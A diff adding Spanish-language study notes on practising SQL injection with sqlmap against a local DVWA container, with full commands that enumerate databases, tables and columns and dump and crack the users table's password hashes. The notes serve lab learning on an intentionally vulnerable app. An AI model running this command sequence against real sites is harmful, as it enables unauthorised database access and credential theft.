@@ -1,0 +1,54 @@
+Notas de Estudio: Práctica de SQL Injection con sqlmap y DVWA
+
+Volver a entrar al contenedor de Kali después
+Si salgo del contenedor, puedo volver a entrar con:
+docker start -ai Kali
+
+1. Descargar y ejecutar DVWA con Docker
+docker pull vulnerables/web-dvwa
+docker run -d -p 8080:80 --name dvwa vulnerables/web-dvwa
+
+
+2. Escanear la vulnerabilidad SQL Injection en el parámetro id
+sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=tu_sesion; security=low" --batch --banner
+Prueba si el parámetro id es vulnerable a SQLi.
+
+--banner: Extrae información del servidor y base de datos.
+
+--batch: Ejecuta sin preguntar.
+
+--cookie: Usa sesión y nivel bajo para evitar bloqueos.
+
+3. Listar bases de datos disponibles
+sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=tu_sesion; security=low" --batch --dbs
+Muestra todas las bases de datos en el servidor. Me sirve para Saber qué bases existen para investigar más.
+
+4. Listar tablas dentro de una base de datos
+sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=tu_sesion; security=low" --batch -D dvwa --tables
+-D dvwa: Indica la base de datos a inspeccionar.
+
+--tables: Muestra las tablas dentro de esa base.
+
+
+
+5. Listar columnas dentro de una tabla
+
+sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=tu_sesion; security=low" --batch -D dvwa -T users --columns
+
+-T users: Tabla a investigar.
+
+--columns: Muestra las columnas de la tabla.
+Me sirve para saber qué datos puedes extraer (ej. user, password).
+
+6. Extraer datos específicos de la tabla
+sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=tu_sesion; security=low" --batch -D dvwa -T users -C user,password --dump
+-C user,password: Columnas que quieres extraer.
+
+--dump: Muestra y guarda los datos.
+sqlmap intenta descifrar contraseñas hash automáticamente.
+
+7. Interpretar resultados
+Usuarios y contraseñas en hash MD5 extraídas.
+
+Contraseñas comunes crackeadas (password, abc123, letmein).
+
